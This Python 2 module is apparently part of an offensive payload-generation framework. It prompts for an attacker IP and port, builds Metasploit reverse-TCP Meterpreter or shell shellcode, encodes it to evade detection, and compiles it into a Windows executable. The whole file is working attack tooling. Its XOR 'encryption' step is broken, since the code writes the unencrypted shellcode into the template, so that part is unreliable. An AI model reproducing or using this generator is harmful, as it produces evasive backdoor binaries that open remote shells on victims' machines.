#!/usr/bin/python
#

import os
import subprocess as subp
from src.core import menus
from src.core.main import *
from src.windows.shellcode import shellcodeGen
from time import sleep
from itertools import izip, cycle
from random import randint

def xor_string(data,key):
	return "".join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
	
def hexlify(b):
	return "\\x%02x"*len(b) % tuple(map(ord, b))

while 1:
	try:
		
		if not os.path.exists("/usr/bin/i586-mingw32msvc-gcc"):
			PrintError("You need to have mingw32 & mingw-w64 installed to use this module")
			EntContinue()
			break

		# set msfpath
		path = msfpath()

		# get current dir
		cwd = os.getcwd()

		# interface ip
		iface = iface_ip()

		# select architecture
		# 1 = 32bit
		# 2 = 64bit
		arch = 0
		while arch != range(1,2):
			clear()
			menus.arch_menu()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				arch = "1"
				break
			elif selection == '2':
				arch = "2"
				break
		
		# select 32bit payload
		if arch == '1':
			selection = 0
			encoder = "x86/shikata_ga_nai"
			outfile = "shellcode32.txt"
			while selection != range(1,2):
				clear()
				menus.shellcode32_menu()
				selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
				if selection == '1':
					payload = "windows/meterpreter/reverse_tcp"
					break
				if selection == '2':
					payload = "windows/shell/reverse_tcp"
					break
					
		if arch == '2':
			selection = 0
			encoder = "x64/xor"
			outfile = "shellcode64.txt"
			while selection != range(1,2):
				clear()
				menus.shellcode64_menu()
				selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
				if selection == '1':
					payload = "windows/x64/meterpreter/reverse_tcp"
					break
				if selection == '2':
					payload = "windows/x64/shell/reverse_tcp"
					break

		# shall we encode the payload?
		menus.win_enc_menu()
		encoding = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))

		#			
		# get some user info
		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
		if ip == '':
			ip = iface
		port = raw_input(" Enter a port (default 8080): ")
		if port == '':
			port = 8080
		if encoding == '1' or encoding == '':
			encoding = '1'
			iterations = raw_input(" Number of times to encode shellcode (default 10): ")
			if iterations == '':
				iterations = 10
				
		# create shellcode
		shellcode = shellcodeGen(path, encoding, payload, ip, port, iterations, encoder)

		key = generate_random_string(randint(1,10), randint(10000,100000))
		PrintInfo("Starting XOR encryption with %s digit random key" % key[1])
		encrypted = xor_string(shellcode, key[0])
		xor = hexlify(encrypted)
		sleep(1)
	
		PrintInfo("Building template.c")
		sleep(1)
	
		# write c file
		template = "src/files/template.c"
		with open(template) as f:
			for line in f:
				with open('output/template.c', 'a') as f_out:
					f_out.write(line.replace('PUTSHELLCODEHERE', shellcode))
		
		# compile payload
		PrintInfo("File created. Compiling...")
		subp.Popen("i586-mingw32msvc-gcc -Wall -mwindows output/template.c -o output/paygen-pl.exe > /dev/null 2>&1", shell=True).wait()
		PrintInfo("File paygen-pl.exe created in the output directory")
		sleep(1)
			
		# clean up
		PrintInfo("Cleaning up...")
		os.remove('output/template.c')
			
		# return to main
		EntContinue()
		break
	except KeyboardInterrupt:
		break
